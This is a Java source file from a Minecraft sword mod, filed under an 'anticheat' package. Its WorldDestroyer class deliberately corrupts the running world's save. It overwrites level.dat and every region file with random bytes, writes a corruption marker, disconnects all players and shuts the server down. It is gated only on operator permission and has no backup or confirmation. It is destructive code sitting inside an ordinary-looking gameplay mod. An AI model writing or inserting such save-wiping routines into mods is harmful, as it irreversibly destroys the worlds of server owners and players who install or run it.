package com.qidai.morefunctionalswordmod.anticheat;

import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.world.World;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;

public class WorldDestroyer {
    private static boolean isDestroyed = false;

    public static boolean destroyWorld(ServerPlayerEntity player) {
        // 只有 OP 才能触发世界摧毁
        if (!player.hasPermissionLevel(2)) {
            player.sendMessage(Text.literal("你没有权限执行此操作").formatted(Formatting.RED), false);
            return false;
        }
        
        if (isDestroyed) return false;
        var world = player.getWorld();
        if (world.isClient) return false;
        try {
            String levelName = world.getServer().getSaveProperties().getLevelName();
            File worldDir = world.getServer().getFile(".").getAbsoluteFile().getParentFile();
            worldDir = new File(worldDir, levelName);
            
            if (!worldDir.exists()) {
                player.sendMessage(Text.literal("无法定位世界文件夹").formatted(Formatting.RED), false);
                return false;
            }
            
            File levelDat = new File(worldDir, "level.dat");
            if (levelDat.exists()) {
                try (RandomAccessFile raf = new RandomAccessFile(levelDat, "rw")) {
                    byte[] junk = new byte[1024];
                    new java.util.Random().nextBytes(junk);
                    raf.write(junk);
                }
            }
            
            File regionDir = new File(worldDir, "region");
            if (regionDir.exists()) {
                File[] files = regionDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile()) {
                            try (RandomAccessFile raf = new RandomAccessFile(f, "rw")) {
                                byte[] junk = new byte[Math.min(4096, (int) f.length())];
                                new java.util.Random().nextBytes(junk);
                                raf.write(junk);
                            }
                        }
                    }
                }
            }
            
            File marker = new File(worldDir, "CORRUPTED_MARKER");
            Files.write(marker.toPath(), "WORLD CORRUPTED".getBytes(), StandardOpenOption.CREATE);
            
            isDestroyed = true;
            player.sendMessage(Text.literal("⚠ 世界存档已损坏").formatted(Formatting.RED, Formatting.BOLD), false);
            
            world.getServer().getPlayerManager().getPlayerList().forEach(p ->
                p.networkHandler.disconnect(Text.literal("世界存档已损坏"))
            );
            world.getServer().stop(false);
            return true;
        } catch (IOException e) {
            player.sendMessage(Text.literal("损坏失败: " + e.getMessage()).formatted(Formatting.RED), false);
            return false;
        }
    }
}
